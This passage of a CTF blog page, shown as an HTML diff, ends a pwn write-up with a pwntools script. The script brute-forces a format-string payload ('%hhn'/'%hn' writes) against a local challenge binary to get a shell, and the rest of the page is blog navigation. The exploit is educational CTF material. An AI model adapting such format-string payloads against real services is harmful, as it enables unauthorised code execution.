class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">file = <span class="string">'./chall'</span></span><br><span class="line">e = ELF(file)</span><br><span class="line">libc = e.libc</span><br><span class="line">rlibc = <span class="string">''</span></span><br><span class="line">ip = <span class="string">''</span></span><br><span class="line">port = <span class="string">''</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(code=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> debug</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(local)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p, libc, debug</span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        p = process(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">        debug = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> rlibc != <span class="string">''</span>:</span><br><span class="line">            libc = ELF(rlibc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">un64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">un32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        run(<span class="number">1</span>)</span><br><span class="line">        rc()</span><br><span class="line">        payload = <span class="string">"%28c%10$hhn|%34218ca%18$hn"</span></span><br><span class="line">        se(payload)</span><br><span class="line">        ru(<span class="string">'a'</span>)</span><br><span class="line">        sl(<span class="string">'ls'</span>)</span><br><span class="line">        rc()</span><br><span class="line">        shell()</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="" src="/images/avatar.png" alt="Mask">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        Mask
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        A newbie in CTF
+                    </p>
+                    
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            12
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            3
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            13
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/mask6asok">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="QQ" href="tencent://message/?uin=1924594189&amp;Site=&amp;menu=yes">
+                
+                <i class="fab fa-qq"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Email" href="mailto:1924594189@qq.com">
+                
+                <i class="fa fa-envelope"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            链接
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://binlep.github.io/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">binLep&#39;s blog</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">binlep.github.io</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/Crypto/">
+            <span class="level-start">
+                <span class="level-item">Crypto</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Others/">
+            <span class="level-start">
+                <span class="level-item">Others</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Pwn/">
+            <span class="level-start">
+                <span class="level-item">Pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">8</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/Conditional-competition/" style="font-size: 10px;">Conditional competition</a> <a href="/tags/IOFILE/" style="font-size: 10px;">IOFILE</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/fmt/" style="font-size: 13.33px;">fmt</a> <a href="/tags/format/" style="font-size: 10px;">format</a> <a href="/tags/heap/" style="font-size: 16.67px;">heap</a> <a href="/tags/integer-overflow/" style="font-size: 10px;">integer overflow</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/libc/" style="font-size: 13.33px;">libc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/stack/" style="font-size: 13.33px;">stack</a> <a href="/tags/tcache/" style="font-size: 13.33px;">tcache</a>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+            <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/12/22/Xman2020冬令营选拔赛Pwn题解.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Xman2020冬令营选拔赛Pwn题解">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-22T11:57:22.029Z">2019-12-22</time></div>
+                    <a href="/2019/12/22/Xman2020冬令营选拔赛Pwn题解.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Xman2020冬令营选拔赛Pwn题解</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/古典密码.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="古典密码学">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T15:15:13.219Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/古典密码.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">古典密码学</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Crypto/">Crypto</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/永恒之蓝测试.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="永恒之蓝测试">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T13:55:22.254Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/永恒之蓝测试.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">永恒之蓝测试</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Others/">Others</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/ubuntu16安装后配置.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Pwn-Ubuntu配置">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T13:55:22.229Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/ubuntu16安装后配置.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Pwn-Ubuntu配置</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/2019护网杯-mergeheap.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="2019 护网杯 mergeheap">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T13:55:22.218Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/2019护网杯-mergeheap.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">2019 护网杯 mergeheap</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/08/">
+                <span class="level-start">
+                    <span class="level-item">八月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">七月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Conditional-competition/">
+                        <span class="tag">Conditional competition</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/IOFILE/">
+                        <span class="tag">IOFILE</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/arm/">
+                        <span class="tag">arm</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/fmt/">
+                        <span class="tag">fmt</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/format/">
+                        <span class="tag">format</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/heap/">
+                        <span class="tag">heap</span>
+                        <span class="tag is-grey">4</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/integer-overflow/">
+                        <span class="tag">integer overflow</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/kernel/">
+                        <span class="tag">kernel</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/libc/">
+                        <span class="tag">libc</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pwn/">
+                        <span class="tag">pwn</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/shellcode/">
+                        <span class="tag">shellcode</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/stack/">
+                        <span class="tag">stack</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/tcache/">
+                        <span class="tag">tcache</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right ">
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/12/22/Xman2020冬令营选拔赛Pwn题解.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Xman2020冬令营选拔赛Pwn题解">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-22T11:57:22.029Z">2019-12-22</time></div>
+                    <a href="/2019/12/22/Xman2020冬令营选拔赛Pwn题解.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Xman2020冬令营选拔赛Pwn题解</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/古典密码.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="古典密码学">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T15:15:13.219Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/古典密码.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">古典密码学</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Crypto/">Crypto</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/永恒之蓝测试.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="永恒之蓝测试">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T13:55:22.254Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/永恒之蓝测试.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">永恒之蓝测试</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Others/">Others</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/ubuntu16安装后配置.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Pwn-Ubuntu配置">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T13:55:22.229Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/ubuntu16安装后配置.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">Pwn-Ubuntu配置</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/12/15/2019护网杯-mergeheap.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="2019 护网杯 mergeheap">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-12-15T13:55:22.218Z">2019-12-15</time></div>
+                    <a href="/2019/12/15/2019护网杯-mergeheap.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">2019 护网杯 mergeheap</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/08/">
+                <span class="level-start">
+                    <span class="level-item">八月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">七月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Conditional-competition/">
+                        <span class="tag">Conditional competition</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/IOFILE/">
+                        <span class="tag">IOFILE</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/arm/">
+                        <span class="tag">arm</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/fmt/">
+                        <span class="tag">fmt</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/format/">
+                        <span class="tag">format</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/heap/">
+                        <span class="tag">heap</span>
+                        <span class="tag is-grey">4</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/integer-overflow/">
+                        <span class="tag">integer overflow</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/kernel/">
+                        <span class="tag">kernel</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/libc/">
+                        <span class="tag">libc</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pwn/">
+                        <span class="tag">pwn</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/shellcode/">
+                        <span class="tag">shellcode</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/stack/">
+                        <span class="tag">stack</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/tcache/">
+                        <span class="tag">tcache</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Mask&#39;s blogs" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2019 Mask&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'Mask6asok.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
